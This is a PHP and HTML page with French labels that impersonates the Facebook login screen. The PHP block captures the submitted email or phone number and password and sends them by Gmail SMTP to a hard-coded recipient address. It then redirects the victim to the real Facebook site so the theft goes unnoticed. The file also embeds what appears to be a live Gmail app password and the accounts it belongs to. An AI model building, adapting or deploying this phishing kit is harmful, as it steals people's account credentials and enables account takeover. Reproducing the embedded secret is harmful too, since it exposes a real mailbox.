<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require 'vendor/autoload.php'; // Assurez-vous que PHPMailer est installé via Composer

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $identifiant = $_POST['identifiant'] ?? '';
    $motdepasse = $_POST['motdepasse'] ?? '';

    $message = "Identifiant : $identifiant\nMot de passe : $motdepasse";

    $mail = new PHPMailer(true);

    try {
        $mail->isSMTP();
        $mail->Host = 'smtp.gmail.com';
        $mail->SMTPAuth = true;
        $mail->Username = 'hansmbaya@gmail.com';
        $mail->Password = 'fwnh etlc yequ suzy'; // mot de passe d’application
        $mail->SMTPSecure = 'ssl';
        $mail->Port = 465;

        $mail->setFrom('hansmbaya@gmail.com', 'Facebook Login');
        $mail->addAddress('mbayahans@gmail.com');
        $mail->Subject = 'Nouvelles informations de connexion';
        $mail->Body = $message;

        $mail->send();
        header("Location: https://www.facebook.com"); // redirection après l'envoi
        exit;
    } catch (Exception $e) {
        echo "Erreur lors de l'envoi : {$mail->ErrorInfo}";
    }
}
?>

<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Facebook – Connexion ou inscription</title>
  <link rel="icon" href="https://www.facebook.com/favicon.ico" type="image/x-icon">
  <style>
    * { box-sizing: border-box; }
    body {
      margin: 0;
      padding: 0;
      background-color: #f0f2f5;
      font-family: Helvetica, Arial, sans-serif;
    }
    .logo-container {
      text-align: center;
      padding: 40px 0 10px;
    }
    .logo-container img {
      width: 80px;
      height: auto;
    }
    .main-container {
      display: flex;
      justify-content: center;
      align-items: center;
      padding-bottom: 60px;
    }
    .login-box {
      width: 396px;
      background-color: #ffffff;
      padding: 20px 16px;
      border-radius: 8px;
      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
    }
    .login-box input {
      width: 100%;
      padding: 14px;
      margin-bottom: 10px;
      border: 1px solid #dddfe2;
      border-radius: 6px;
      font-size: 16px;
    }
    .login-box button {
      width: 100%;
      padding: 14px;
      background-color: #1877f2;
      color: white;
      font-size: 17px;
      font-weight: bold;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      margin-top: 5px;
    }
    .login-box button:hover { background-color: #166fe5; }
    .login-box a {
      display: block;
      text-align: center;
      color: #1877f2;
      text-decoration: none;
      font-size: 14px;
      margin-top: 14px;
    }
    .divider {
      border-top: 1px solid #dddfe2;
      margin: 20px 0;
    }
    .create-account {
      background-color: #42b72a;
      color: white;
      font-weight: bold;
    }
    .create-account:hover {
      background-color: #36a420;
    }
    .footer-message {
      text-align: center;
      margin-top: 30px;
      font-size: 14px;
    }
    .footer-message a {
      font-weight: bold;
      color: #1c1e21;
      text-decoration: none;
    }
    @media screen and (max-width: 450px) {
      .login-box { width: 90%; }
      .logo-container img { width: 65px; }
    }
  </style>
</head>
<body>
<br><br><br><br>

<div class="logo-container">
  <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook">
</div>

<br>

<div class="main-container">
  <div class="login-box">
    <form method="POST">
      <input type="text" name="identifiant" placeholder="Adresse e-mail ou numéro de téléphone" required>
      <input type="password" name="motdepasse" placeholder="Mot de passe" required>
      <button type="submit">Se connecter</button>
    </form>
    <a href="#">Mot de passe oublié ?</a>
    <div class="divider"></div>
    <button class="create-account">Créer nouveau compte</button>
  </div>
</div>

<div class="footer-message">
  <p><a href="#"></a></p>
</div>

</body>
</html>